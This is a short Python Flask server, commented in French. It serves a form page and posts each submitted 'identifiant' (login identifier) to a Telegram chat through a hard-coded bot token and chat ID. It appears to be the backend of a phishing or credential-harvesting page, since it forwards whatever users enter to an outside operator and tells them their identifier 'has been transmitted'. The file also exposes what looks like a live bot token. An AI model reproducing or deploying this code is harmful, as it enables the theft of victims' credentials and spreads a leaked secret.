import os
from flask import Flask, request
import requests

app = Flask(__name__)

# 🔐 Clé API et ID de chat Telegram
TELEGRAM_BOT_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

# 📄 Route d'accueil qui affiche le formulaire
@app.route('/')
def home():
    return open('index.html').read()

# 📤 Route de traitement du formulaire
@app.route('/submit', methods=['POST'])
def submit():
    identifiant = request.form.get('identifiant')

    message = f"📥 Nouveau formulaire reçu :\n🔑 Identifiant : {identifiant}"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    requests.post(url, data=data)

    return "Merci ! Votre identifiant a été transmis."

# 🚀 Lancement de l'application Flask
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
